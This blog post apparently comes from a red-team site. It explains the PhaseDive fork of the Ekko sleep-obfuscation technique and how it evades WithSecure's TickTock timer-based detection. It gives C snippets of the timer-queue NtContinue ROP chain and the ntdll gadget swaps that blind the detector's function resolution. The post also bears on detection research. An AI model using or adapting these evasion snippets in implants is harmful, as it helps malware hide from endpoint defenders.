# https://tishina.in/execution/phase-dive-sleep-obfuscation

[![](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/simple.png)](https://tishina.in/home)

appsec

execution

[bof-lazy-loading](https://tishina.in/execution/bof-lazy-loading)

[byovm](https://tishina.in/execution/byovm)

[caveman-bofs](https://tishina.in/execution/caveman-bofs)

[DOUBLEGOD-and-insomnia-loader](https://tishina.in/execution/DOUBLEGOD-and-insomnia-loader)

[golang-winmaldev-basics](https://tishina.in/execution/golang-winmaldev-basics)

[linux-evasion-primitives](https://tishina.in/execution/linux-evasion-primitives)

[nim-fibers](https://tishina.in/execution/nim-fibers)

[nim-noload-dll-hollowing](https://tishina.in/execution/nim-noload-dll-hollowing)

[phase-dive-sleep-obfuscation](https://tishina.in/execution/phase-dive-sleep-obfuscation)

[pyd-execute-assembly](https://tishina.in/execution/pyd-execute-assembly)

[python-inmemory-bof](https://tishina.in/execution/python-inmemory-bof)

[replacing-memfd-with-fuse](https://tishina.in/execution/replacing-memfd-with-fuse)

initial-access

ops

opsec

[home](https://tishina.in/home)

[![](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/simple.png)](https://tishina.in/home)

# phase-dive-sleep-obfuscation

# tl;dr

PoC: [https://github.com/zimnyaa/PhaseDive/](https://github.com/zimnyaa/PhaseDive/)

This post explains the idea behind the PhaseDive Ekko fork meant to complicate [Ekko](https://github.com/Cracked5pider/Ekko) detection with [https://github.com/WithSecureLabs/TickTock](https://github.com/WithSecureLabs/TickTock).

Before:

![Pasted image 20221013181445.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013181445.png)

After:

![Pasted image 20221013182614.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013182614.png)

# Ekko idea

The main idea of the Ekko sleep obfuscation technique is creating a chain of timers with CreateTimerQueueTimer that point to NtContinue as a callback:

```c
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD );
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
```

By populating the `CONTEXT` struct, it is possible to use NtContinue with a single argument to make arbitrary calls by populating the registers with arguments:

```c
// VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rip   = VirtualProtect;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;
```

The timer chain thus is able to execute several functions in order without the need for the main image to be executed. This is used to change the protection of the main module, encrypt it, sleep, and revert the changes.

# Ekko detection

WithSecure have recently released a post with a PoC tool at [https://github.com/WithSecureLabs/TickTock](https://github.com/WithSecureLabs/TickTock) to detect Ekko. It is best explained in the article, but the main idea is scanning the process memory for timers, enumerating callback functions for these timers for any discovered references to `NtContinue`, and peeking `CONTEXT` structs.

The detection result looks something like this:

![Pasted image 20221013181445.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013181445.png)

# Trampoline bypasses

It is evident that a huge chunk of visibility into what timers are doing is due to symbol resolution, which is easiest to bypass with trampolines.

## `CONTEXT.Rip` -\> `VirtualProtect` detection

Suppose the detection logic is based upon resolving the functions the timers use as a callback. By finding a `jmp` gadget and using it like shown below, we can blind this detection.

```c
// VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rip   = VirtualProtect;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;
// IS CHANGED TO
 // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rax   = VirtualProtect;
        RopProtRX.Rip   = ntdll_jmprax;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;
```

The resulting detection is as follows:

![Pasted image 20221013181947.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013181947.png)

It is possible to spoof a wide range of functions by using different gadgets to redirect control flow.

## `NtContinue` timer detections

But what if detections are designed to alert on **any** timers that point to `NtContinue`? It turns out that `ntdll.dll` has several `call <ntdll.ZwContinue>` gadgets we can use. I've baked mine statically into a PoC and probably broke something, so it needs to be changed to test on a different Windows installation.

Thus, the timer queue became this:

```c
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
```

And the detection was not able to properly resolve the functions:

![Pasted image 20221013182614.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013182614.png)

The timer callback calls were still doing the things they were supposed to, which is sleep masking:

![Pasted image 20221013182709.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013182709.png)

![Pasted image 20221013182700.png](https://publish-01.obsidian.md/access/c7ce07c5421851d0d6a9c4b6320620d9/images/Pasted%20image%2020221013182700.png)

# credits

C5pider for Ekko

WithSecureLabs for detection research

phase-dive-sleep-obfuscation

Not found

This page does not exist

Interactive graph

On this page

tl;dr

Ekko idea

Ekko detection

Trampoline bypasses

CONTEXT.Rip -> VirtualProtect detection

NtContinue timer detections

credits

[Powered by Obsidian Publish](https://publish.obsidian.md/)